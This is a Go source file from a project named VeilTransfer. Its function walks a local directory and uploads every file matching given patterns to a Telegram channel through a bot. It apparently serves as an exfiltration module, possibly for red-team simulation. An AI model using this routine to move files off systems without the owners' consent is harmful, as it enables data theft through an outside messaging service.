package transfer

import (
    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
    "fmt"
    "os"
    "VeilTransfer/utils"    
)

func UploadTelegram(bot *tgbotapi.BotAPI, localPath string, channelID int64, includePatterns []string) error {
    return utils.WalkAndUpload(localPath, "", includePatterns, func(localFilePath, _ string) error {
        fileInfo, err := os.Stat(localFilePath)
        if err != nil {
            return fmt.Errorf("[-] failed to stat local file: %s", err)
        }

        if fileInfo.IsDir() {
            fmt.Printf("[!] Skipping directory: %s (directories are not uploaded as files)\n", localFilePath)
            return nil
        }

        fmt.Printf("[*] Attempting to upload file: %s to Telegram channel ID: %d\n", localFilePath, channelID)

        progress := make(chan int64, 1)
        go func() {
            for p := range progress {
                percentage := float64(p) / float64(fileInfo.Size()) * 100
                fmt.Printf("[*] Uploading %s: %.2f%% complete\n", localFilePath, percentage)
            }
        }()

        sendDoc := tgbotapi.NewDocument(channelID, tgbotapi.FilePath(localFilePath))

        _, err = bot.Send(sendDoc)
        if err != nil {
            return fmt.Errorf("[-] failed to upload file to Telegram: %s", err)
        }

        return nil
    })
}
